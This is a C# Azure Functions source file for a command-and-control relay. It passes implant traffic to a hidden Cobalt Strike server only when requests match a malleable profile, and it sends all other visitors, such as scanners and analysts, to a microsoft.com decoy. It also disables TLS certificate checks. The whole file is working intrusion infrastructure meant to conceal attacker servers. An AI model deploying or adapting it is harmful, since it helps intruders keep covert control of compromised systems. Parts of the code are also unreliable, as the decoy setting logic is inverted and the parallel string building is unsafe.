using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System.Net.Http;
using System.Net;
using System.Linq;
using System.Linq.Expressions;
using System.Collections.Generic;
using Microsoft.Extensions.Primitives;
using System.Reflection.Metadata.Ecma335;
using System.Text;
using GenericC2Relay;

namespace GenericC2Relay
{
    public class MallProfile
    {
        public string UserAgent { get; set; }
        public List<MallRule> MallRules { get; set; }
    }
    public class MallRule
    {

        public string HttpType { get; set; }
        public List<string> UriPaths { get; set; }
        public Dictionary<string, string> Headers { get; set; }
    }

    public static class StreamExtensions
    {
        public static byte[] ReadAllBytes(this Stream instream)
        {
            if (instream is MemoryStream)
                return ((MemoryStream)instream).ToArray();

            using (var memoryStream = new MemoryStream())
            {
                instream.CopyTo(memoryStream);
                return memoryStream.ToArray();
            }
        }
    }


    public class GenericC2Relay
    {

#if DEBUG
        public static string RealC2EndPoint = "http://localhost:8080/";
        public static string MalleableProfileB64 = "";
        public static string DecoyRedirect = "http://microsoft.com";
#else
      public static string RealC2EndPoint = Environment.GetEnvironmentVariable("RealC2EndPoint");
      public static string MalleableProfileB64 = Environment.GetEnvironmentVariable("MalleableProfileB64");
      public static string DecoyRedirect = Environment.GetEnvironmentVariable("DecoyRedirect");
#endif

        public static HttpClient GetHttpClient()
        {
            //This is so we can use non-signed /default https certs at the real C2 endpoint

            var handler = new HttpClientHandler();
            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
            handler.ServerCertificateCustomValidationCallback =
                (httpRequestMessage, cert, cetChain, policyErrors) =>
                {
                    return true;
                };

            ServicePointManager.ServerCertificateValidationCallback +=
             (sender, cert, chain, error) =>
             {
                 return true;
             };

            return new HttpClient(handler)
            {

                Timeout = TimeSpan.FromSeconds(5)
            };
        }

        public static HttpClient httpClient = GetHttpClient();



        [FunctionName("AzureC2Relay")]
        public static async Task<ActionResult> AzureRelay([HttpTrigger(AuthorizationLevel.Anonymous, "get", "put", "post", "delete", Route = "{*requestPath}")] HttpRequest inputHttpReuqest, string requestPath, ILogger log)
        {
            try
            {

                //Dummy objects
                HttpResponseMessage responseStream = new HttpResponseMessage();
                HttpRequestMessage bufferHttpReq = new HttpRequestMessage();

                MallProfile mallProfile = new MallProfile()
                {
                    UserAgent = "",
                    MallRules = new List<MallRule> { }

                };

                //Do we have what we need to fill the mallProfile
                if (!string.IsNullOrEmpty(MalleableProfileB64))
                {
                    //Get that rule set
                    mallProfile = JsonConvert.DeserializeObject<MallProfile>(Encoding.UTF8.GetString(Convert.FromBase64String(MalleableProfileB64)));
                }

                //Do we have what we need to fill the DecoyRedirect
                if (!string.IsNullOrEmpty(DecoyRedirect))
                {
                    DecoyRedirect = "http://microsoft.com";
                }


                //Holder for start of get query
                var getQuery = "?";

                Parallel.ForEach(inputHttpReuqest.Query, (queryObject) =>
                {

                    //If we have more data in the query then just ?
                    if (getQuery.Length > 1)
                        getQuery += "&";
                    //Add the query key
                    getQuery += queryObject.Key.ToString();

                    //If the query value for this key is not NullOrEmpty, add it
                    if (!string.IsNullOrEmpty(queryObject.Value.ToString()))
                        getQuery += "=" + queryObject.Value.ToString();

                   
                });

                if (getQuery.Equals("?"))
                    getQuery = "";




                //Parse over headers
                Parallel.ForEach(inputHttpReuqest.Headers, (inputHeader) =>
                {

                    //We cannot set Content-Length stuff in the in headers for httpClient
                    if (!inputHeader.Key.Contains("Content-Length"))
                    {

                        StringBuilder headerValueBilder = new StringBuilder();
                        foreach (var headerValue in inputHeader.Value)
                        {

                            if (headerValueBilder.Length > 0)
                                headerValueBilder.Append("; ");

                            headerValueBilder.Append(headerValue);
                        }

                        log.LogInformation("HEADER: " + inputHeader.Key + " - " + headerValueBilder.ToString());

                        //Add them to the buffer req
                        bufferHttpReq.Headers.Add(inputHeader.Key, headerValueBilder.ToString());
                    }
                });


                //If this is a GET call
                if (inputHttpReuqest.Method == HttpMethod.Get.Method)
                {
                    if (!VerifyMallable(inputHttpReuqest, mallProfile, HttpMethod.Get.Method, log))
                        return new RedirectResult(DecoyRedirect);

                    log.LogInformation("Forwarding GET request => " + requestPath + getQuery);

                    bufferHttpReq.Method = HttpMethod.Get;
                    bufferHttpReq.RequestUri = new Uri(RealC2EndPoint + requestPath + getQuery);
                    responseStream = await httpClient.SendAsync(bufferHttpReq);
                }
                //If this is a POST call
                else if (inputHttpReuqest.Method == HttpMethod.Post.Method)
                {

                    if (!VerifyMallable(inputHttpReuqest, mallProfile, HttpMethod.Post.Method, log))
                        return new RedirectResult(DecoyRedirect);

                    log.LogInformation("Forwarding POST request => " + requestPath + getQuery);

                    bufferHttpReq.Method = HttpMethod.Post;
                    bufferHttpReq.RequestUri = new Uri(RealC2EndPoint + requestPath + getQuery);
                    bufferHttpReq.Content = new ByteArrayContent(inputHttpReuqest.Body.ReadAllBytes());

                    responseStream = await httpClient.SendAsync(bufferHttpReq);
                }
                //If this is a PUT call
                else if (inputHttpReuqest.Method == HttpMethod.Put.Method)
                {
                    //We cant confirm these since Cobalt only supports GET and POST
                    log.LogInformation("Forwarding PUT request => " + requestPath + getQuery);

                    bufferHttpReq.Method = HttpMethod.Put;
                    bufferHttpReq.RequestUri = new Uri(RealC2EndPoint + requestPath + getQuery);
                    bufferHttpReq.Content = new ByteArrayContent(inputHttpReuqest.Body.ReadAllBytes());

                    responseStream = await httpClient.SendAsync(bufferHttpReq);
                }
                //If this is a Delete call
                else if (inputHttpReuqest.Method == HttpMethod.Delete.Method)
                {
                    //We cant confirm these since Cobalt only supports GET and POST
                    log.LogInformation("Forwarding DELETE request => " + requestPath + getQuery);

                    bufferHttpReq.Method = HttpMethod.Delete;
                    bufferHttpReq.RequestUri = new Uri(RealC2EndPoint + requestPath + getQuery);
                    responseStream = await httpClient.SendAsync(bufferHttpReq);


                }

                //Default return type
                var contentType = "text/html";
                if (responseStream.Content?.Headers?.ContentType != null)
                    contentType = responseStream.Content?.Headers?.ContentType?.MediaType;


                //Return data stream as a byteArray, as well as the ContentType
                var someData = await responseStream.Content.ReadAsByteArrayAsync();

                log.LogInformation($"Returning response type {contentType}");

                return new FileContentResult(someData, contentType);
            }
            catch (Exception ex)
            {
                log.LogError($"Expection thrown: {ex.Message}");
            }

            return new FileContentResult(new byte[] { }, "text/html");
        }

        private static bool VerifyMallable(HttpRequest inputHttpReuqest, MallProfile mallProfile, string method, ILogger log)
        {
            if (mallProfile.MallRules.Count() > 0)
            {

                if (!string.IsNullOrEmpty(mallProfile.UserAgent))
                {
                    //Check the user agent
                    inputHttpReuqest.Headers.TryGetValue("User-Agent", out var httpAgent);
                    if (httpAgent.Count() > 0)
                    {
                        var sentUserAgent = httpAgent.FirstOrDefault();
                        if (!mallProfile.UserAgent.Equals(sentUserAgent))
                        {

                            log.LogError($"Request failed to verify, invalid user agent");
                            return false;
                        }
                    }
                    else
                    {
                        log.LogError($"Request failed to verify, missing user agent");
                        return false;
                    }
                }

                MallRule getRules = mallProfile.MallRules.Where(x => x.HttpType.ToLower().Equals("http-" + method.ToLower())).FirstOrDefault();

                //Check the path 
                string sentPath = inputHttpReuqest.Path.ToString();

                IEnumerable<string> foundCount = getRules.UriPaths.Where(rulePath => sentPath.StartsWith(rulePath));
                if (foundCount.Count() == 0)
                {
                    log.LogError($"Request failed to verify, invalid/missing path");
                    return false;

                }

                //Check the headers, but we wanna skip the host header
                foreach (KeyValuePair<string, StringValues> headerKeyPair in ConvertHeaders(getRules.Headers).Where(ruleHeaders => !ruleHeaders.Key.Equals("Host")))
                {
                    if (!inputHttpReuqest.Headers.Contains(headerKeyPair))
                    {
                        log.LogError($"Request failed to verify, could not find {headerKeyPair} header!");

                        return false;
                    }

                }
                log.LogInformation($"Request verified!");
                return true;
            }
            else
            {
                //If we don't have a mallprofile, then every req is OK
                return true;
            }
        }

        private static Dictionary<string, StringValues> ConvertHeaders(Dictionary<string, string> headers)
        {
            Dictionary<string, StringValues> tempDict = new Dictionary<string, StringValues>();
            foreach (var headerKeypair in headers)
            {
                tempDict.Add(headerKeypair.Key, headerKeypair.Value);
            }

            return tempDict;
        }

    }
}
